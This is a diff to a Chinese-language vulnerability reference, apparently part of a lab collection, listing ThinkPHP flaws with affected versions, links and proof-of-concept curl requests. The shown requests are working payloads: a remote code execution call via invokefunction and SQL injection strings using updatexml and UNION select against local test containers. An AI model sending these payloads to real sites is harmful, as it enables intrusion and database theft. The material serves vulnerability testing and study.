@@ -6,7 +6,8 @@
 
 影响范围
 
-* 5.1.X - 5.1.31, 5.0.X - 5.0.23
+* 5.0.X - 5.0.23
+* 5.1.X - 5.1.31
 
 Poc
 
@@ -18,6 +19,7 @@ curl -g '127.0.0.1/public/index.php?s=/index/\think\app/invokefunction&function=
 参考文档
 
 * [thinkphp5框架缺陷导致远程代码执行](https://mp.weixin.qq.com/s/oWzDIIjJS2cwjb4rzOM4DQ)
+* [Thinkphp5 远程代码执行漏洞事件分析报告](https://paper.seebug.org/770/)
 * [thinkphp_v5_rce.txt](https://github.com/coffeehb/Some-PoC-oR-ExP/blob/a9f165d7bc5bcc2b5e03153577bdfd83f35b0564/thinkphp/thinkphp_v5_rce.txt)
 
 ## Thinkphp preg_replace 代码执行漏洞
@@ -56,26 +58,24 @@ Poc
 curl '127.0.0.1/public/index.php/index/index/testsql?username[0]=inc&username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&username[2]=1
 ```
 
-
-
 ## Thinkphp3.2.3 update注入漏洞
 
 测试镜像
 
-- src/thinkphp/3.2.3/
+* src/thinkphp/3.2.3/
 
 影响版本
 
-- Thinkphp < 3.2.3
+* Thinkphp < 3.2.3
 
 参考链接
 
-- [Thinkphp3.2.3最新版update注入漏洞](https://paper.seebug.org/573/)
+* [Thinkphp3.2.3最新版update注入漏洞](https://paper.seebug.org/573/)
 
 Poc
 
 ```shell
-curl 'http://172.17.0.2/index.php/home/user?user\[0\]=bind&user\[1\]=money_0%20or%201%20and(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))&money=qwe'
+curl -g 'http://172.17.0.2/index.php/home/user?user[0]=bind&user[1]=money_0%20or%201%20and(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))&money=qwe'
 ```
 
 返回内容包含sql报错：XPATH syntax error: '~root@localhost~'
@@ -86,19 +86,19 @@ curl 'http://172.17.0.2/index.php/home/user?user\[0\]=bind&user\[1\]=money_0%20o
 
 测试镜像
 
-- src/thinkphp/3.2.3/
+* src/thinkphp/3.2.3/
 
 影响版本
 
-- Thinkphp 3.x 5.x
+* Thinkphp 3.x 5.x
 
 参考文档
 
-- [ThinkPHP框架架构上存在SQL注入](https://www.secpulse.com/archives/29826.html)
+* [ThinkPHP框架架构上存在SQL注入](https://www.secpulse.com/archives/29826.html)
 
 Poc
 
 ```shell
-curl 'http://172.17.0.2/index.php/home/user/exp_inject?id\[\]=exp&id\[\]=%3d888%20union%20select%201,database(),3%23'
+curl -g 'http://172.17.0.2/index.php/home/user/exp_inject?id[]=exp&id[]=%3d888%20union%20select%201,database(),3%23'
 ```
 
